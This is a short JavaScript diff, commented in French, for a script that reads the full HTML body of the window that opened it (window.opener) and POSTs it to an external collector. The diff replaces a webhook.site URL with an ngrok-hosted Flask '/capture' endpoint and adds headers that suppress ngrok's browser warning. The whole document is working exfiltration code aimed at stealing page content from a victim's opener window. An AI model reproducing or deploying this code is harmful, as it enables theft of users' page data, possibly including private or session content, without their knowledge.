@@ -12,14 +12,19 @@
         if (window.opener) {
             let bodyContent = window.opener.document.body.innerHTML;
 
-            // Envoyer les données vers un serveur
-            fetch("https://webhook.site/36597752-ac84-4513-97b5-4443a634465c", { // Remplace par ton URL webhook
+            // Envoi des données vers ton serveur Flask via ngrok
+            fetch("https://e4a4-2a04-cec0-1020-604e-e5d3-59aa-943a-2da0.ngrok-free.app/capture", {  // URL de ton serveur Flask exposé
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
+                headers: {
+                    "Content-Type": "application/json",
+                    "ngrok-skip-browser-warning": "true",  // En-tête pour supprimer la page d'avertissement de ngrok
+                    "User-Agent": "MyCustomUserAgent"  // Optionnel, en-tête pour contourner l'avertissement dans certains cas
+                },
                 body: JSON.stringify({ content: bodyContent })
-            }).then(() => {
-                console.log("Body envoyé !");
-            }).catch(err => console.error("Erreur:", err));
+            }).then(response => response.json())
+                .then(data => {
+                    console.log("Réponse du serveur Flask :", data);
+                }).catch(err => console.error("Erreur :", err));
         } else {
             console.log("Pas d'opener disponible");
         }
